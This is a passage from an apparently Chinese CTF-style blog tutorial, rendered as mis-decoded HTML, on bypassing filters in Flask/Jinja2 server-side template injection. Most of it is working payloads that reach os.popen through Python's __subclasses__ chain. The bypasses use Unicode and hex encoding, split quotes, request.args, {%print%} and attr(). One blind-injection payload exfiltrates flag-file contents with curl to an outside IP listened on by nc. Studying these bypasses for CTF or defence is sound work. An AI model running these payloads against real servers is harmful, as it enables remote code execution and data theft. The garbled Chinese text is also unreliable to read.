string">'__import__("os").popen("ls /").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨payloadä¸­ï¼Œåªè¦æ˜¯å­—ç¬¦ä¸²çš„ï¼Œå³payloadä¸­å¼•å·å†…çš„ï¼Œéƒ½å¯ä»¥ç”¨ç¼–ç ç»•è¿‡ã€‚åŒç†è¿˜å¯ä»¥è¿›è¡Œrot13ã€16è¿›åˆ¶ç¼–ç ç­‰ã€‚</p>
<h4 id="åˆ©ç”¨Unicodeç¼–ç ç»•è¿‡å…³é”®å­—ï¼ˆflaské€‚ç”¨ï¼‰"><a href="#åˆ©ç”¨Unicodeç¼–ç ç»•è¿‡å…³é”®å­—ï¼ˆflaské€‚ç”¨ï¼‰" class="headerlink" title="åˆ©ç”¨Unicodeç¼–ç ç»•è¿‡å…³é”®å­—ï¼ˆflaské€‚ç”¨ï¼‰"></a>åˆ©ç”¨Unicodeç¼–ç ç»•è¿‡å…³é”®å­—ï¼ˆflaské€‚ç”¨ï¼‰</h4><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨unicodeç¼–ç çš„æ–¹æ³•ï¼Œç»•è¿‡å…³é”®å­—è¿‡æ»¤ï¼Œä¾‹å¦‚ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\u0065\u0076\u0061\u006c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls /").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>

<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'\u006f\u0073'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'\u006c\u0073\u0020\u002f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>ç­‰åŒäºï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls /").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>

<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="åˆ©ç”¨Hexç¼–ç ç»•è¿‡å…³é”®å­—"><a href="#åˆ©ç”¨Hexç¼–ç ç»•è¿‡å…³é”®å­—" class="headerlink" title="åˆ©ç”¨Hexç¼–ç ç»•è¿‡å…³é”®å­—"></a>åˆ©ç”¨Hexç¼–ç ç»•è¿‡å…³é”®å­—</h4><p>å’Œä¸Šé¢é‚£ä¸ªä¸€æ ·ï¼Œåªä¸è¿‡å°†Unicodeç¼–ç æ¢æˆäº†Hexç¼–ç ï¼Œé€‚ç”¨äºè¿‡æ»¤äº†â€œuâ€çš„æƒ…å†µã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\x65\x76\x61\x6c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls /").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>

<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'\x6f\x73'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'\x6c\x73\x20\x2f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>ç­‰åŒäºï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls /").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>

<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="åˆ©ç”¨å¼•å·ç»•è¿‡"><a href="#åˆ©ç”¨å¼•å·ç»•è¿‡" class="headerlink" title="åˆ©ç”¨å¼•å·ç»•è¿‡"></a>åˆ©ç”¨å¼•å·ç»•è¿‡</h4><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¼•å·æ¥ç»•è¿‡å¯¹å…³é”®å­—çš„è¿‡æ»¤ã€‚ä¾‹å¦‚ï¼Œè¿‡æ»¤äº†flagï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨ flâ€â€ag æˆ– flâ€™â€™ag çš„å½¢å¼æ¥ç»•è¿‡ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/fl"</span><span class="token string">"ag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å‚è€ƒ<a href="https://xz.aliyun.com/t/9584#toc-13">ä»¥ Bypass ä¸ºä¸­å¿ƒè°­è°ˆ Flask-jinja2 SSTI çš„åˆ©ç”¨</a></p>
<h2 id="flaskè¿‡æ»¤ç»ƒä¹ "><a href="#flaskè¿‡æ»¤ç»ƒä¹ " class="headerlink" title="flaskè¿‡æ»¤ç»ƒä¹ "></a>flaskè¿‡æ»¤ç»ƒä¹ </h2><h3 id="flaskæ— è¿‡æ»¤"><a href="#flaskæ— è¿‡æ»¤" class="headerlink" title="flaskæ— è¿‡æ»¤"></a>flaskæ— è¿‡æ»¤</h3><p>è¿™ä¸ªæ˜¯æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œé‡‡ç”¨çš„æ˜¯flaskæ¡†æ¶çš„jinja2æ¨¡æ¿ï¼Œ<br>å…ˆæ‹¿å®ƒåšå®éªŒ<br>é¦–å…ˆè·å–ç©ºå­—ç¬¦ä¸²å¯¹è±¡çš„åŸºç±»<code>object</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
æˆ–è€…code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>è·å–åŸºç±»<code>object</code>çš„æ‰€æœ‰å­ç±»<br>æ ¹æ®å¸¸ç”¨æ³¨å…¥æ¨¡å—æˆ‘ä»¬æŸ¥æ‰¾æ˜¯å¦å«æœ‰<code>&lt;class &#39;os._wrap_close&#39;&gt;</code><br><img src="https://img-blog.csdnimg.cn/07180aa1b9d24427a032f3c92c53d4e5.png" alt="789"><br>è¿™ä¸ªæ—¶å€™æ‰¾åˆ°<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>å¯¹åº”çš„ç¼–å·ï¼Œå°†æ‰€æœ‰å­ç±»å¤åˆ¶å‡ºæ¥æŒ‰è¡Œæ’åˆ—ï¼Œç”±äºè®°äº‹æœ¬æ˜¯ä»1è¡Œå¼€å§‹æ’åˆ—ï¼Œè€Œæˆ‘ä»¬è®¡ç®—å­ç±»æ˜¯ä»0å¼€å§‹ï¼Œæ˜¾ç¤ºåœ¨118è¡Œï¼Œå¯¹åº”ç¼–å·ä¸º117</p>
<blockquote>
<p>Pythonä¸­ç´¢å¼•æ˜¯ä»0å¼€å§‹çš„<br>è¯·æ³¨æ„ï¼Œç”±äº__subclasses__()æ–¹æ³•è¿”å›çš„æ˜¯å½“å‰è¿è¡Œæ—¶æ‰€æœ‰ç›´æ¥å­ç±»çš„åˆ—è¡¨ï¼Œå…·ä½“çš„å­ç±»é¡ºåºå¯èƒ½ä¼šéšç€Pythonç‰ˆæœ¬ã€å®ç°å’Œç¯å¢ƒçš„å˜åŒ–è€Œæœ‰æ‰€ä¸åŒã€‚å› æ­¤ï¼Œè¿™æ®µä»£ç çš„å…·ä½“è¾“å‡ºå°†å–å†³äºä½ è¿è¡Œçš„Pythonç¯å¢ƒã€‚</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/9ada2137faee4a4fb673024cf7b55701.png" alt="789"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/952bf190e6cb481f816fb6cb7bc31605.png" alt="456"></p>
<p>è®¿é—®è¯¥å­ç±»çš„ <code>__init__ </code>æ–¹æ³•çš„<code>__globals__</code>å±æ€§ã€‚<br>å‘ç°æœ‰oså‡½æ•°<br><img src="https://img-blog.csdnimg.cn/bf73577451764a219ad24f0b3f8e9877.png" alt="123"><br>åœ¨è¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æˆ–è€…ä½¿ç”¨<code>__builtins__</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>





<p><img src="https://img-blog.csdnimg.cn/d09578caf19e40f08cd1f334b088e455.png" alt="789"><br>åˆ©ç”¨å†…å»ºå‡½æ•°eval<br><code>code=&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/e33fd0455ba04537806411548a066568.png" alt="1"><br><code>code=&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/f0a6e437eb5c4283a359731cb10d73fe.png" alt="789"></p>
<h3 id="è¿‡æ»¤åŒå¤§æ‹¬å·"><a href="#è¿‡æ»¤åŒå¤§æ‹¬å·" class="headerlink" title="è¿‡æ»¤åŒå¤§æ‹¬å·"></a>è¿‡æ»¤åŒå¤§æ‹¬å·</h3><p>è¿™é‡Œè¿‡æ»¤äº†<code>&#123;&#123;&#125;&#125;</code>ï¼Œä½ å¯ä»¥ä½¿ç”¨<code>&#123;%print()%&#125;</code><br><code>code=&#123;%print(8*8)%&#125;</code><br>æˆåŠŸå›æ˜¾64ï¼Œåé¢æ­¥éª¤ä¸€æ ·</p>
<p><code>code=&#123;%print(().__class__.__base__.__subclasses__()[117].__init__.__globals__.popen("ls").read())%&#125; code=&#123;%print(().__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()"))%&#125;</code></p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>&#123;% if ... %&#125;1&#123;% endif %&#125; </code>é…åˆ <code>os.popen</code> å’Œ <code>curl </code>å°†æ‰§è¡Œç»“æœå¤–å¸¦ï¼ˆä¸å¤–å¸¦çš„è¯æ— å›æ˜¾ï¼‰å‡ºæ¥</p>
<blockquote>
<p>1ã€æœåŠ¡å™¨ç›‘å¬ç«¯å£ï¼š</p>
<p>nc -lnvp 80<br>2ã€payloadï¼š<br><code>&#123;% if config.__class__.__init__.__globals__['os'].popen('curl http://8.130.xx.xx:80/`cat /f*`').read()=='p' %&#125;1&#123;% endif %&#125;</code></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/5ba05bb509a64b6981cce4dfd716247d.png" alt="789"></p>
<h3 id="flaskæ— å›æ˜¾"><a href="#flaskæ— å›æ˜¾" class="headerlink" title="flaskæ— å›æ˜¾"></a>flaskæ— å›æ˜¾</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1</span>ã€æœåŠ¡å™¨ç›‘å¬ç«¯å£ï¼š
nc <span class="token operator">-</span>lnvp <span class="token number">80</span>
<span class="token number">2</span>ã€payloadï¼š
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'curl http://8.130.xx.xx:80/`cat /f*`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'p'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token number">1</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/5ba05bb509a64b6981cce4dfd716247d.png" alt="789"></p>
<h3 id="è¿‡æ»¤ä¸­æ‹¬å·"><a href="#è¿‡æ»¤ä¸­æ‹¬å·" class="headerlink" title="è¿‡æ»¤ä¸­æ‹¬å·"></a>è¿‡æ»¤ä¸­æ‹¬å·</h3><p>è¿™é‡Œåªæ˜¯è¿‡æ»¤äº†<code>[]</code><br>å¦‚æœæ²¡æœ‰ä»»ä½•è¿‡æ»¤å°±ç›´æ¥åˆ°</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>ä½†æ˜¯è¿™é‡Œéœ€è¦ç»•è¿‡`<span class="token punctuation">[</span><span class="token punctuation">]</span>`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><img src="https://img-blog.csdnimg.cn/c3ffdc809d0344c5884b6d507b07b0f0.png" alt="789"></p>
<h3 id="è¿‡æ»¤äº†å•ã€åŒå¼•å·"><a href="#è¿‡æ»¤äº†å•ã€åŒå¼•å·" class="headerlink" title="è¿‡æ»¤äº†å•ã€åŒå¼•å·"></a>è¿‡æ»¤äº†å•ã€åŒå¼•å·</h3><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨<strong>requestå¯¹è±¡ç»•è¿‡</strong><a href="https://3143047748.github.io/2023/11/15/SSTI%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%AD%A6%E4%B9%A0/#request%E7%BB%95%E8%BF%87%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4">è¯¦ç»†è§£é‡Š</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token comment">#ç„¶ågetä¼ å‚a=popen&amp;b=ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/d0e661f4058c467eb2dfc0e1ff0ada18.png" alt="123"></p>
<h3 id="è¿‡æ»¤ä¸‹åˆ’çº¿"><a href="#è¿‡æ»¤ä¸‹åˆ’çº¿" class="headerlink" title="è¿‡æ»¤ä¸‹åˆ’çº¿"></a>è¿‡æ»¤ä¸‹åˆ’çº¿</h3><p>è¿™ä¸ªé¢˜ç›®è¿‡æ»¤äº†ä¸‹åˆ’çº¿ï¼Œä¹Ÿå°±æ˜¯è¯´<code>__class__</code>ç­‰å¸¦ä¸‹åˆ’çº¿çš„éƒ½ä¸èƒ½è¾“å…¥ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ä¸Šé¢çš„æ–¹æ³•<strong>requestå¯¹è±¡ç»•è¿‡</strong>ï¼Œæ¯”å¦‚è¯´è¦è¾“å…¥<code>&#123;&#123;''.__class__&#125;&#125;</code>é‚£å°±å¯ä»¥è¿™æ ·</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token comment">#ç„¶ågetä¼ å…¥__calss__</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/9e0bfb01bbf74dc18972cc8fcc054a63.png" alt="123"><br>ä»¥æ­¤ç±»æ¨ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#?a=__class__&amp;b=__base__</span>
code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>c<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#?a=__class__&amp;b=__base__&amp;c=__subclasses__</span>
code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>c<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>d<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>e<span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#?a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__init__&amp;e=__globals__</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/5ca68e768f8b4065a5aee6b36856c117.png" alt="456"></p>
<h3 id="è¿‡æ»¤äº†-æ¨¡æ¿æ³¨å…¥"><a href="#è¿‡æ»¤äº†-æ¨¡æ¿æ³¨å…¥" class="headerlink" title="è¿‡æ»¤äº†.æ¨¡æ¿æ³¨å…¥"></a>è¿‡æ»¤äº†<code>.</code>æ¨¡æ¿æ³¨å…¥</h3><h4 id="attr-å‡½æ•°"><a href="#attr-å‡½æ•°" class="headerlink" title="attr()å‡½æ•°"></a>attr()å‡½æ•°</h4><p>åœ¨<strong>flaskæ¡†æ¶</strong>çš„jinja2æ¨¡æ¿ä¸­å¦‚æœ<code>.</code>è¢«è¿‡æ»¤äº†é‚£ä¹ˆå¯ä»¥ä½¿ç”¨åŸç”Ÿjinja2çš„attr()å‡½æ•°ã€‚<br>æ¯”å¦‚ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">code<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token comment">#æ”¹å†™ä¸º</span>
